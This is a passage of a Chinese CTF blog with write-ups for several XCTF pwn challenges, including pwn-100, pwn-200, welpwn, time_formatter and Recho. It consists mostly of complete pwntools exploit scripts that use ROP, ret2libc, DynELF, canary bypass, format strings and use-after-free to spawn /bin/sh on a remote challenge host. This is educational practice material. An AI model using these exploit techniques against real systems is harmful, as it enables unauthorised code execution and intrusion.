class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br><span class="hljs-comment">#p = process(&quot;./pwn100&quot;)</span><br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>, <span class="hljs-number">56721</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn100&quot;</span>)<br> <br>start_addr = <span class="hljs-number">0x400550</span>                <span class="hljs-comment">#程序开始地址</span><br>pop_rdi_addr = <span class="hljs-number">0x400763</span>               <span class="hljs-comment">#pop rdi ; ret</span><br>puts_addr = elf.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br><br><span class="hljs-comment">#DynELF获得system地址</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak</span>(<span class="hljs-params">addr</span>):<br>    payload = cyclic(<span class="hljs-number">0x40</span> + <span class="hljs-number">0x8</span>)               <span class="hljs-comment">#padding</span><br>    payload += p64(pop_rdi_addr) + p64(addr) + p64(puts_addr)        <span class="hljs-comment">#rip+addr+put函数地址</span><br>    payload += p64(start_addr)                         <span class="hljs-comment">#返回地址</span><br>    payload = payload.ljust(<span class="hljs-number">200</span>, <span class="hljs-string">b&quot;A&quot;</span>)<br>    p.send(payload)<br>    p.recvuntil(<span class="hljs-string">b&quot;bye~\n&quot;</span>)<br>    data = p.recv()<br>    data = data[:-<span class="hljs-number">1</span>]            <span class="hljs-comment">#截取丢弃/n</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>        data = <span class="hljs-string">b&quot;\x00&quot;</span>          <span class="hljs-comment">#空数据填充</span><br>    <span class="hljs-comment">#data = data[:8]</span><br>    <span class="hljs-comment">#print(&quot;puts addr: &quot;, data)</span><br>    <span class="hljs-keyword">return</span> data <br>d = DynELF(leak, elf=elf)<br>system_addr = d.lookup(<span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;libc&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;system addr:&quot;</span>, <span class="hljs-built_in">hex</span>(system_addr))<br><br><span class="hljs-comment">#向bss段写入/bin/sh</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;----------- write /bin/sh to bss --------------&quot;</span>)<br>str_addr = <span class="hljs-number">0x601000</span>                <span class="hljs-comment">#写入的地址</span><br>pop6_addr = <span class="hljs-number">0x40075a</span>   <br>movcall_addr = <span class="hljs-number">0x400740</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;准备发送&quot;</span>)<br>read_got = elf.got[<span class="hljs-string">&quot;read&quot;</span>]<br>payload = cyclic(<span class="hljs-number">0x40</span> + <span class="hljs-number">0x8</span>)<br>payload += p64(pop6_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(read_got) + p64(<span class="hljs-number">8</span>) + p64(str_addr) + p64(<span class="hljs-number">0</span>) + p64(movcall_addr)<br>payload += cyclic(<span class="hljs-number">56</span>)<br>payload += p64(start_addr)<br>payload =  payload.ljust(<span class="hljs-number">200</span>, <span class="hljs-string">b&quot;B&quot;</span>)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&quot;bye~\n&quot;</span>)<br>p.send(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;成功发送&quot;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;----------- get shell --------------&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x40</span> + <span class="hljs-number">0x8</span>) <br>payload += p64(pop_rdi_addr) + p64(str_addr) + p64(system_addr) + p64(start_addr)<br>payload =  payload.ljust(<span class="hljs-number">200</span>, <span class="hljs-string">b&quot;B&quot;</span>)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwn-200"><a href="#pwn-200" class="headerlink" title="pwn-200"></a>pwn-200</h3><h4 id="ret2libc、DynELF"><a href="#ret2libc、DynELF" class="headerlink" title="ret2libc、DynELF"></a>ret2libc、DynELF</h4><p><img src="/2023/03/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/image-20230322154115477.png" alt="image-20230322154115477"></p><p>思路：使用DynELF通过泄露的write地址，获得system地址；在bss段写入&#x2F;bin&#x2F;sh；通过溢出点构造rop</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;61.147.171.105&#x27;</span>,<span class="hljs-number">50595</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main_addr = <span class="hljs-number">0x80484be</span><br>fun_addr = <span class="hljs-number">0x80484be</span><br>write_plt = elf.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_plt = elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>ppp_ret = <span class="hljs-number">0x080485cd</span>   <span class="hljs-comment">#平栈地址 ROPgadget --binary pwn-200 --only &quot;pop|ret&quot;</span><br><br><span class="hljs-comment">#DynELF获得system地址</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak</span>(<span class="hljs-params">addr</span>):<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x6c</span>+p32(<span class="hljs-number">0</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="hljs-number">1</span>)+p32(addr)+p32(<span class="hljs-number">4</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>, payload)<br>    data = p.recv()<br>    <span class="hljs-keyword">return</span> data <br>d = DynELF(leak, elf=elf)<br>system_addr = d.lookup(<span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;libc&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;system addr:&quot;</span>, <span class="hljs-built_in">hex</span>(system_addr))<br><br>bss_addr = elf.bss()<br><span class="hljs-comment">#read有三个参数所以返回前需要pop三次调整栈平衡</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x6c</span>+p32(<span class="hljs-number">0</span>)+p32(read_plt)+p32(ppp_ret)+p32(<span class="hljs-number">0</span>)+p32(bss_addr)+p32(<span class="hljs-number">8</span>)+p32(system_addr)+p32(<span class="hljs-number">0</span>)+p32(bss_addr)<br>p.sendlineafter(<span class="hljs-string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>, payload)<br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="monkey"><a href="#monkey" class="headerlink" title="monkey"></a>monkey</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>,<span class="hljs-string">&quot;54838&quot;</span>)<br><span class="hljs-comment">#p = process(&#x27;./js&#x27;,env=&#123;&#x27;LD_LIBRARY_PATH&#x27;:&#x27;./&#x27;&#125;)</span><br>p.sendlineafter(<span class="hljs-string">&#x27;js&gt; &#x27;</span>, <span class="hljs-string">&quot;os.system(&#x27;cat flag&#x27;)&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><h4 id="ROP-ret2libc、绕过Canary"><a href="#ROP-ret2libc、绕过Canary" class="headerlink" title="ROP-ret2libc、绕过Canary"></a>ROP-ret2libc、绕过Canary</h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake">one_gadget就是用来去查找动态链接库里execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, rsp+<span class="hljs-number">0</span>x70, environ)函数的地址的<br>sudo apt -y <span class="hljs-keyword">install</span> ruby<br>sudo gem <span class="hljs-keyword">install</span> one_gadget<br></code></pre></td></tr></table></figure><img src="image-20230320222907843.png" alt="image-20230320222907843" style="zoom:67%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;61.147.171.105&#x27;</span>,<span class="hljs-number">59945</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]        <span class="hljs-comment">#put函数只需要一个参数rdi</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main_addr = <span class="hljs-number">0x400908</span><br>pop_rdi = <span class="hljs-number">0x400a93</span><br><br><span class="hljs-comment"># 泄露canary地址</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x88</span>)             <span class="hljs-comment">#让\n将canary最低位\x00覆盖</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;A\n&#x27;</span>)<br>canary = u64(p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><br><span class="hljs-comment"># 泄露puts函数实际地址</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x88</span> + p64(canary) + <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(payload)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>real_puts = u64(p.recv().ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(real_puts))<br><br><span class="hljs-comment"># 获取execve实际地址</span><br>base = real_puts - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>execve = base + <span class="hljs-number">0x45216</span>                       <span class="hljs-comment">#one_gadget得到的偏移地址</span><br><br><span class="hljs-comment"># 构造payload溢出获取shell</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x88</span> + p64(canary) + <span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">8</span> + p64(execve)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(payload)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="实时数据监测"><a href="#实时数据监测" class="headerlink" title="实时数据监测"></a>实时数据监测</h3><h4 id="格式化字符串-大数覆盖"><a href="#格式化字符串-大数覆盖" class="headerlink" title="格式化字符串-大数覆盖"></a>格式化字符串-大数覆盖</h4><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_15">https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_15</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote(&#x27;61.147.171.105&#x27;,59945)</span><br>p = process(<span class="hljs-string">&#x27;./123&#x27;</span>)<br><span class="hljs-comment">#fmtstr_payload是pwntools里面的一个工具，用来简化对格式化字符串漏洞的构造工作</span><br>payload = fmtstr_payload(<span class="hljs-number">12</span>, &#123;<span class="hljs-number">0x0804a048</span>: <span class="hljs-number">0x02223322</span>&#125;)  <br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">fmtstr<span class="hljs-constructor">_payload(<span class="hljs-params">offset</span>, <span class="hljs-params">writes</span>, <span class="hljs-params">numbwritten</span>=0, <span class="hljs-params">write_size</span>=&#x27;<span class="hljs-params">byte</span>&#x27;)</span><br>第一个参数表示格式化字符串的偏移；<br>第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成&#123;printfGOT: systemAddress&#125;<br>第三个参数表示已经输出的字符个数，这里没有，为<span class="hljs-number">0</span>，采用默认值即可；<br>第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（<span class="hljs-built_in">int</span>），对应着hhn、hn和n，默认值是byte，即按hhn写。<br></code></pre></td></tr></table></figure><h3 id="welpwn"><a href="#welpwn" class="headerlink" title="welpwn"></a>welpwn</h3><h4 id="ret2cus、DynELF"><a href="#ret2cus、DynELF" class="headerlink" title="ret2cus、DynELF"></a>ret2cus、DynELF</h4><p>将buf的内容写入s2中，s2距离rbp只有0x10，可以进行溢出。但是发现是向s2中赋值的时候，遇到’\x00’就会中断for循环，而rbp肯定存在’\x00’。</p><img src="image-20230323115314643.png" alt="image-20230323115314643" style="zoom: 80%;" /><p><img src="/2023/03/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/image-20230323115916920.png" alt="image-20230323115916920"></p><img src="image-20230323115103117.png" alt="image-20230323115103117" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=remote(<span class="hljs-string">&#x27;61.147.171.105&#x27;</span>,<span class="hljs-number">56291</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./welpwn&#x27;</span>)<br>pop4 = <span class="hljs-number">0x40089C</span>             <span class="hljs-comment">#出栈3次，绕过/x00截断</span><br>pop6_addr = <span class="hljs-number">0x40089A</span>        <span class="hljs-comment">#ret2csu</span><br>movecall_addr = <span class="hljs-number">0x400880</span>    <span class="hljs-comment">#ret2csu</span><br>poprdi = <span class="hljs-number">0x4008A3</span>   <span class="hljs-comment">#一次出栈赋值rdi</span><br>main_func = <span class="hljs-number">0x400630</span><br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br><span class="hljs-comment">#dynelf获取system地址</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak</span>(<span class="hljs-params">addr</span>):<br>    p.recv()<br>    rop = p64(pop6_addr)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(write_got)+p64(<span class="hljs-number">8</span>)+p64(addr)+p64(<span class="hljs-number">1</span>)+p64(movecall_addr)+<span class="hljs-string">b&#x27;x&#x27;</span>*<span class="hljs-number">56</span>+p64(main_func)<br>    p.send((<span class="hljs-string">b&#x27;x&#x27;</span>*<span class="hljs-number">24</span> + p64(pop4) + rop).ljust(<span class="hljs-number">1024</span>,<span class="hljs-string">b&#x27;X&#x27;</span>))<br>    data = p.recv(<span class="hljs-number">8</span>)<br>    <span class="hljs-keyword">return</span> data<br>d = DynELF(leak, elf=elf)<br>system = d.lookup(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;libc&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(system))<br><span class="hljs-comment">#bss写入sh并调用system执行</span><br>p.recv()<br>bss_addr = elf.bss()<br>rop = p64(pop6_addr)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(read_got)+p64(<span class="hljs-number">8</span>)+p64(bss_addr)+p64(<span class="hljs-number">0</span>)+p64(movecall_addr)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span><br>rop += p64(poprdi) + p64(bss_addr) + p64(system)<br>p.send((<span class="hljs-string">b&#x27;x&#x27;</span>*<span class="hljs-number">24</span> + p64(pop4) + rop).ljust(<span class="hljs-number">1024</span>,<span class="hljs-string">b&#x27;X&#x27;</span>))<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="time-formatter"><a href="#time-formatter" class="headerlink" title="time_formatter"></a>time_formatter</h3><h4 id="Use-After-Free-Heap"><a href="#Use-After-Free-Heap" class="headerlink" title="Use After Free-Heap"></a>Use After Free-Heap</h4><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/</a></p><p><code>1) Set a time format.</code>对应函数sub_400E00，申请内存存储字符串并检查格式，这里注意sub_400E43也调用了堆申请函数。</p><img src="image-20230323164713414.png" alt="image-20230323164713414" style="zoom:80%;" /><p>sub_400D74函数内sub_400C26申请内存</p><p><img src="/2023/03/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/image-20230323164224582.png" alt="image-20230323164224582"></p><p>将包含ptr的格式化command给system执行</p><p><img src="/2023/03/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/image-20230323165551927.png" alt="image-20230323165551927"></p><p>思路：<br> 1.首先随便给ptr数值让它申请，但是最好和后面要填的参数长度相同；<br> 2.然后选择5，free掉内存，<strong>因为没有置空，所以这个时候ptr成为了悬空指针</strong>；<br> 3.然后我们去选择3，会再次申请堆。得到的堆地址就是之前ptr free掉的，然后写入&#x2F;bin&#x2F;sh；<br> 4.最后选择4，command中有了命令，执行之后获得shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote(&#x27;61.147.171.105&#x27;,59692)</span><br>p = process(<span class="hljs-string">&#x27;./123&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Format: &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">10</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Are you sure you want to exit (y/N)? &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;N&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Time zone: &#x27;</span>)<br>p.sendline(<span class="hljs-string">&quot;&#x27;;/bin/sh&#x27;&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Recho"><a href="#Recho" class="headerlink" title="Recho"></a>Recho</h3><h4 id="劫持got表、ORW"><a href="#劫持got表、ORW" class="headerlink" title="劫持got表、ORW"></a>劫持got表、ORW</h4><p><img src="/2023/03/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/image-20230324092249472.png" alt="image-20230324092249472"></p><p>syscall 与alarm函数起点 <code>mov eax</code> 的偏移量为 5。</p><p>把alarm的got表地址放在rdi里，然后把偏移量5放到rax里，我们就实现了把alarma的调用改成了syscall的调用</p><img src="image-20230323212938434.png" alt="image-20230323212938434"  /><p><img src="/2023/03/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/image-20230323213832841.png" alt="image-20230323213832841"></p><p>open()、read()、print()构造长ROP。全部<code>pop|ret</code>，代码里需要</p><p><img src="/2023/03/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/image-20230323221400625.png" alt="image-20230323221400625"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/usr/i</span>nclude<span class="hljs-regexp">/x86_64-linux-gnu/</span>asm/unistd_64.h   <span class="hljs-comment">#查看系统调用号，open为2</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#p = process(&quot;./1&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;61.147.171.105&#x27;</span>,<span class="hljs-number">64809</span>)<br>e = ELF(<span class="hljs-string">&quot;./1&quot;</span>)<br><br>alarm_plt = p64(e.plt[<span class="hljs-string">&quot;alarm&quot;</span>])<br>alarm_got = p64(e.got[<span class="hljs-string">&quot;alarm&quot;</span>])<br>read_plt = p64(e.plt[<span class="hljs-string">&quot;read&quot;</span>])<br>printf_plt = p64(e.plt[<span class="hljs-string">&quot;printf&quot;</span>])<br>prax = p64(<span class="hljs-number">0x4006fc</span>)<br>prsi_r15 = p64(<span class="hljs-number">0X4008a1</span>)<br>prdi = p64(<span class="hljs-number">0x4008a3</span>)<br>prdx = p64(<span class="hljs-number">0x4006fe</span>)<br>rdi_addrax = p64(<span class="hljs-number">0x40070d</span>)<br>bss_buf = p64(<span class="hljs-number">0x601090</span>)            <span class="hljs-comment">#bss段写入地址</span><br>flag = p64(<span class="hljs-number">0x601058</span>)                <span class="hljs-comment">#flag位置</span><br><br>payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x38</span><br>payload += prdi + alarm_got        <span class="hljs-comment">#alarm函数地址给rdi</span><br>payload += prax + p64(<span class="hljs-number">0X5</span>)       <span class="hljs-comment">#5传给rax</span><br>payload += rdi_addrax             <span class="hljs-comment">#alarm函数地址加5到syscall地址</span><br><br><span class="hljs-comment"># fd = open(“flag”,READONLY)</span><br>payload +=  prsi_r15 + p64(<span class="hljs-number">0x0</span>) + p64(<span class="hljs-number">0x0</span>)        <span class="hljs-comment">#rsi=0(READONLY)</span><br>payload += prdi + flag                            <span class="hljs-comment">#flag地址给rdi</span><br>payload += prax + p64(<span class="hljs-number">0x2</span>)                        <span class="hljs-comment">#rax=2,sys_call_table[2] = open</span><br>payload += alarm_plt                               <span class="hljs-comment">#执行syscall</span><br><br><span class="hljs-comment">#read(fd,stdin_buffer,100)</span><br>payload += prdi + p64(<span class="hljs-number">0x3</span>)                   <span class="hljs-comment">#open()打开文件返回的文件描述符一般从 3 开始，依次顺序增加</span><br>payload += prsi_r15 + bss_buf + p64(<span class="hljs-number">0x0</span>)     <span class="hljs-comment">#rsi = buf,buf存放读取 </span><br>payload += prdx + p64(<span class="hljs-number">0x30</span>)                   <span class="hljs-comment">#大小</span><br>payload+=read_plt                             <span class="hljs-comment">#read函数</span><br><br><span class="hljs-comment">#print(buf)</span><br>payload += prdi + bss_buf + printf_plt<br><br>p.recvuntil(<span class="hljs-string">&#x27;Welcome to Recho server!\n&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x200</span>))                           <span class="hljs-comment">#足够长，容纳payload</span><br>payload=payload.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>p.send(payload)<br>p.shutdown(<span class="hljs-string">&#x27;send&#x27;</span>)         <span class="hljs-comment">#关闭输入流</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="greeting-150"><a href="#greeting-150" class="headerlink" title="greeting-150"></a>greeting-150</h3><h4 id="格式化字符串、覆盖-fini-array"><a href="#格式化字符串、覆盖-fini-array" class="headerlink" title="格式化字符串、覆盖 .fini_array"></a>格式化字符串、覆盖 .fini_array</h4><p><img src="/2023/03/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/image-20230324204055495.png" alt="image-20230324204055495"></p><p>linux x86程序执行流程。在main函数之前会执行一些其他的函数，init_array数组里面的函数会被一一执行，而且main函数结束后还会执行fini_array数组里面的函数。</p><img src="image-20230324203904013.png" alt="image-20230324203904013" style="zoom: 80%;" /><img src="image-20230324204532466.png" alt="image-20230324204532466" style="zoom:50%;" 